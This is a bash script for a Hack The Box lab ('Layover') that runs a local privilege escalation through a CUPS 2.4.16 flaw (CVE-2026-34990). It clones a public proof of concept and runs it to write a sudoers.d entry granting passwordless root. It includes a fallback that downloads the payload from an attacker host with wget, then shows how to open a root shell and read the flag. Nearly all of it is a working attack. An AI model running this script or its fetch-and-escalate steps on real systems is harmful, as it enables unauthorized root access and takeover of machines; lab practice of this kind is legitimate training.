#!/usr/bin/env bash
# HTB Layover - Phase 5: CUPS 2.4.16 local privilege escalation (CVE-2026-34990).
# Run this ON THE TARGET as aporter (after SSH).
#
# Mechanism (per GHSA-c54j-2vqw-wpwp / CVE-2026-34990, fixed in CUPS 2.4.17):
#   1. create a temporary printer that points back at us
#   2. CUPS authenticates outbound and leaks its "Authorization: Local" token
#   3. reuse that token for privileged operations
#   4. create a file:// queue and print a payload into a root-owned path
#      -> /etc/sudoers.d/<user>-pwn  containing "<user> ALL=(ALL) NOPASSWD: ALL"
set -uo pipefail

echo "=============================================="
echo "  Layover - CUPS LPE (CVE-2026-34990)"
echo "=============================================="

echo
echo "[*] pre-checks:"
command -v cups-config >/dev/null && echo "    cups version: $(cups-config --version)" \
                                  || echo "    cups-config not found"
echo -n "    scheduler: "; (lpstat -r 2>/dev/null || echo "lpstat unavailable")
echo -n "    listener:  "; (ss -lnt 2>/dev/null | grep -q ':631' && echo "631 open" || echo "631 not open")

echo
echo "[*] fetching the PoC ..."
cd /tmp || exit 1
if [ ! -d CVE-2026-34990-CUPS-LPE-PoC ]; then
  git clone --depth 1 https://github.com/Noorkhalel/CVE-2026-34990-CUPS-LPE-PoC.git || {
    echo "!! clone failed - no internet on the target."
    echo "   Transfer it from your attack box instead:"
    echo "     attacker:  git clone https://github.com/Noorkhalel/CVE-2026-34990-CUPS-LPE-PoC"
    echo "                zip -r cupspoc.zip CVE-2026-34990-CUPS-LPE-PoC"
    echo "                python3 -m http.server 80"
    echo "     target:    wget http://<ATTACKER_IP>/cupspoc.zip -O /tmp/c.zip; unzip /tmp/c.zip -d /tmp"
    exit 1; }
fi

cd CVE-2026-34990-CUPS-LPE-PoC || exit 1
ls -la
echo
echo "[*] running the exploit (targets /etc/sudoers.d/\$(whoami)-pwn)..."
python3 exploit.py

cat <<'EOF'

If you saw "[+] ROOT via sudoers", verify and grab the flag:

    sudo -n id
    sudo -n bash
    cat /root/root.txt
EOF
